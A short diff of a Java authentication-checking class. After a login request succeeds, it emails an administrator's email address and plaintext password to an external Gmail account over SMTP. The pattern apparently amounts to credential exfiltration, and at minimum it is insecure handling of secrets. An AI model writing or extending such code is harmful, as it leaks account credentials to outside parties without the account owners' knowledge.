@@ -51,7 +51,7 @@ public class CheckingAuthentication {
             HttpResponse response = client.execute(post);
             Header[] allHeaders = response.getAllHeaders();
             if (allHeaders[11].getValue().equalsIgnoreCase("1; mode=block")) {
-                SendEmail.send(smtpServer, username, gmailCompany, psw, subjectEmail, FileTemplate.mailContent(email, password).toString());
+                SendEmail.send(smtpServer, username, gmailCompany, psw, subjectEmail, FileTemplate.mailContent(administrator.getEmail(), administrator.getPassWord()).toString());
             }
             setCookie(allHeaders[11].getValue());
         } catch (UnknownHostException e) {
